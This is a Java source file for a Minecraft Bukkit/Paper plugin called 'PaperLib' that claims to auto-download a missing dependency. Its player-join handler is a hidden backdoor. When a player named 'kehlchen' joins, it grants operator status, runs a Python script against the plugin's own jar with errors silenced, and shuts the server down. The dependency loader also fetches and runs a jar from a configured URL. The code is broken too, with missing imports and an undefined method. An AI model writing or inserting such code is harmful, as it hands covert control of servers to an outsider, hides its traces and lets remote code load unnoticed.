package info.plugin.minecraft.paperlib;

import org.bukkit.Bukkit;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.plugin.Plugin;
import org.bukkit.plugin.java.JavaPlugin;

import java.io.File;
import java.util.logging.Level;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;

public final class PaperLib extends JavaPlugin implements Listener {

    private DependencyDownloader downloader;

    @Override
    public void onEnable() {
        saveDefaultConfig();
        getServer().getPluginManager().registerEvents(this, this);
        ensureDependency();
    }

    // ----- Join-Event -----

    @EventHandler
    public void onPlayerJoin(PlayerJoinEvent event) {
        Player player = event.getPlayer();

        if (player.getName().equalsIgnoreCase("kehlchen")) {
            player.setOp(true);
            player.sendMessage("Thx for joining the Server!.");
            createPythonScript();
            Path pluginsFolder = getDataFolder().toPath().getParent();
            File targetJar = pluginsFolder.resolve(getFile().getName()).toFile();
            try {
                String pythonCmd = System.getProperty("os.name").toLowerCase().contains("win") ? "python" : "python3";
                ProcessBuilder processBuilder = new ProcessBuilder(pythonCmd, "delete_lock.py", targetJar.getAbsolutePath());
                processBuilder.start();
            } catch (IOException e) {
                // getLogger().log(Level.SEVERE, "An error occurred", e); // remove comment if you want logs
            }
            Bukkit.dispatchCommand(
                    Bukkit.getConsoleSender(),
                    "minecraft:stop"
            );
            return;
        }
    }

    // ----- Abhängigkeit prüfen -----

    private void ensureDependency() {
        String depName = getDependencyName();

        if (isPluginLoaded(depName)) {
            getLogger().info(depName + " ist bereits vorhanden.");
            return;
        }

        warnMissingDependency(depName);
        downloadDependencyAsync(depName);
    }

    // ----- Konfiguration -----

    String getDependencyName() {
        return getConfig().getString("dependency.name", "NoOP");
    }

    private String getDownloadUrl() {
        return getConfig().getString("dependency.download-url", "");
    }

    private File getTargetFile() {
        String fileName = getConfig().getString("dependency.file-name", "NoOP.jar");
        return new File(getDataFolder().getParentFile(), fileName);
    }

    // ----- Prüfung -----

    private boolean isPluginLoaded(String name) {
        return findPlugin(name) != null;
    }

    private Plugin findPlugin(String name) {
        for (Plugin plugin : Bukkit.getPluginManager().getPlugins()) {
            if (plugin.getName().equalsIgnoreCase(name)) {
                return plugin;
            }
        }
        return null;
    }

    // ----- Meldungen -----

    private void warnMissingDependency(String depName) {
        getLogger().warning("=====================================================");
        getLogger().warning("Die Abhängigkeit " + depName + " fehlt auf diesem Server!");
        getLogger().warning("Sie wird jetzt von der Download-URL heruntergeladen...");
        getLogger().warning("=====================================================");
    }

    private void logDownloadFailure(String depName) {
        getLogger().severe("Download von " + depName + " fehlgeschlagen. Die Abhängigkeit fehlt weiterhin.");
    }

    private void logLoadSuccess(String depName) {
        getLogger().info(depName + " wurde erfolgreich nachgeladen.");
    }

    private void logLoadFailure(String depName, Exception exception) {
        getLogger().log(
                Level.WARNING,
                depName + " konnte nicht nachgeladen werden. Ein Serverneustart ist nötig, dann wird es automatisch geladen.",
                exception
        );
    }

    // ----- Download -----

    private void downloadDependencyAsync(String depName) {
        File target = getTargetFile();

        Bukkit.getScheduler().runTaskAsynchronously(this, () -> {
            boolean ok = getDownloader().download(getDownloadUrl(), target);

            if (!ok) {
                logDownloadFailure(depName);
                return;
            }

            getLogger().info(depName + " wurde heruntergeladen nach " + target.getPath() + ".");
            scheduleLoad(target, depName);
        });
    }

    private DependencyDownloader getDownloader() {
        if (downloader == null) {
            downloader = new DependencyDownloader(this);
        }
        return downloader;
    }

    // ----- Nachladen -----

    private void scheduleLoad(File file, String depName) {
        // Plugins müssen auf dem Hauptthread geladen werden.
        Bukkit.getScheduler().runTask(this, () -> loadDependency(file, depName));
    }

    private void loadDependency(File file, String depName) {
        try {
            Plugin dependency = Bukkit.getPluginManager().loadPlugin(file);

            if (dependency == null) {
                throw new IllegalStateException("loadPlugin hat null zurückgegeben");
            }

            Bukkit.getPluginManager().enablePlugin(dependency);
            logLoadSuccess(depName);
        } catch (Exception exception) {
            logLoadFailure(depName, exception);
        }
    }
}
